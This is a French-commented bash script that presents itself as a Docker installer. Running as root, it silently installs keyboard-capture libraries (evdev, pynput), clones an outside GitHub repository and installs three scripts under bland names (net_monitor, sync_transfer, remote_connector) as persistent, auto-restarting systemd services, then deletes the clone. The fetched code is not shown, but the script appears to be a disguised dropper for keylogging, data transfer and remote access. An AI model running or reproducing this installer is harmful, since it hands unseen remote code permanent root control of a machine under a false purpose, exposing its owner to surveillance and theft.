#!/usr/bin/env bash
#
# install_all.sh

REPO_URL="https://github.com/YoubaDJAOUTI/install-docker.git"

SCRIPT_1="net_monitor.py"
SCRIPT_2="sync_transfer.py"
SCRIPT_3="remote_connector.py"

TEMP_DIR="/tmp/install_agents_repo"

INSTALL_DIR="/usr/local/bin"

AGENT_1="net_monitor"
AGENT_2="sync_transfer"
AGENT_3="remote_connector" 

SERVICE_1="net-monitor.service"
SERVICE_2="sync-transfer.service"
SERVICE_3="remote-connector.service"

PYTHON_CMD="/usr/bin/python3"

if [[ $EUID -ne 0 ]]; then
  echo "[!] Ce script doit être exécuté en root (sudo)."
  exit 1
fi

echo "[*] Mise à jour des paquets et installation de Python3, pip, git et Docker..."
apt-get update -y && apt-get upgrade -y
apt-get install -y python3 python3-pip docker.io git

if [[ $? -ne 0 ]]; then
  echo "[!] Échec lors de l'installation de Python/pip/git/Docker."
  exit 1
fi

systemctl enable docker
systemctl start docker


echo "[*] Installation des dépendances Python..."
pip3 install --upgrade evdev requests pynput &> /dev/null

echo "[*] Clonage du dépôt : $REPO_URL -> $TEMP_DIR"
rm -rf "$TEMP_DIR"
git clone "$REPO_URL" "$TEMP_DIR" &> /dev/null
if [[ $? -ne 0 ]]; then
  echo "[!] Échec du clonage du dépôt Git."
  exit 1
fi

echo "[*] Déplacement et renommage des scripts..."


if [[ -f "$TEMP_DIR/$SCRIPT_1" ]]; then
  mv "$TEMP_DIR/$SCRIPT_1" "$INSTALL_DIR/$AGENT_1"
  chmod +x "$INSTALL_DIR/$AGENT_1"
fi


if [[ -f "$TEMP_DIR/$SCRIPT_2" ]]; then
  mv "$TEMP_DIR/$SCRIPT_2" "$INSTALL_DIR/$AGENT_2"
  chmod +x "$INSTALL_DIR/$AGENT_2"
fi


if [[ -f "$TEMP_DIR/$SCRIPT_3" ]]; then
  mv "$TEMP_DIR/$SCRIPT_3" "$INSTALL_DIR/$AGENT_3"
  chmod +x "$INSTALL_DIR/$AGENT_3"
fi

echo "[*] Création des services systemd..."

SERVICE_DIR="/etc/systemd/system"

cat <<EOF > "$SERVICE_DIR/$SERVICE_1"
[Unit]
Description=Network Monitor Agent
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_CMD $INSTALL_DIR/$AGENT_1
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
cat <<EOF > "$SERVICE_DIR/$SERVICE_2"
[Unit]
Description=Sync Transfer Agent
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_CMD $INSTALL_DIR/$AGENT_2
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

cat <<EOF > "$SERVICE_DIR/$SERVICE_3"
[Unit]
Description=Remote Connector Agent
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_CMD $INSTALL_DIR/$AGENT_3
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload

systemctl enable "$SERVICE_1"
systemctl start "$SERVICE_1"

systemctl enable "$SERVICE_2"
systemctl start "$SERVICE_2"

systemctl enable "$SERVICE_3"
systemctl start "$SERVICE_3"

rm -rf "$TEMP_DIR"
